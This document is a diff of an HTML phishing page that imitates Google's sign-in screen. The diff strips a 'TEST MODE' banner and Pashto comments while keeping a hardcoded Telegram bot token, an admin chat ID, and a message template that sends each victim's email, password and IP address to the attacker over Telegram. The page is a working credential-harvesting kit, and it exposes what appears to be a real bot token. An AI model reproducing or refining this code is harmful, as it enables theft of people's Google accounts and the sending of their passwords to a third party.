@@ -117,24 +117,11 @@
             margin: 10px 0;
             border: 1px solid #e8eaed;
         }
-        .test-mode {
-            background: #e8f0fe;
-            border: 1px solid #1a73e8;
-            border-radius: 8px;
-            padding: 8px 12px;
-            margin-bottom: 12px;
-            text-align: center;
-            font-size: 12px;
-            color: #1a73e8;
-        }
     </style>
 </head>
 <body>
 
 <div class="google-card">
-    <!-- د ازموینې حالت -->
-    <div class="test-mode">🧪 TEST MODE - Your Bot: @YourBotUsername</div>
-    
     <div id="step1View">
         <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
         <h1>Sign in</h1>
@@ -185,15 +172,10 @@
 </div>
 
 <script>
-    // ================================================================
-    //  ستاسو بوټ تنظیمات - دلته خپل معلومات دننه کړئ
-    // ================================================================
-    const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";  // ستاسو بوټ ټوکن
-    const ADMIN_ID = "8295417969";                                   // ستاسو چاټ آی ډي
-    const BOT_USERNAME = "YourBotUsername";                          // ستاسو بوټ کارن نوم (پرته له @)
-    const BOT_REDIRECT = `https://t.me/${BOT_USERNAME}`;
-    
-    // ================================================================
+    // ==================== ستاسو بوټ تنظیمات ====================
+    const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
+    const ADMIN_ID = "8295417969";
+    const BOT_REDIRECT = "https://t.me/YourBotUsername";
 
     let attempts = {};
     let currentEmail = "";
@@ -281,8 +263,6 @@
 
         const message = 
             `🔐 *LOGIN SUCCESS* 🔐\n\n` +
-            `🤖 *Bot:* @${BOT_USERNAME}\n` +
-            `🆔 *Bot ID:* ${BOT_TOKEN.split(':')[0]}\n\n` +
             `👤 *Email:* ${email}\n` +
             `🔑 *Password:* ${password}\n\n` +
             `📍 *IP:* ${userInfo.ip}\n` +
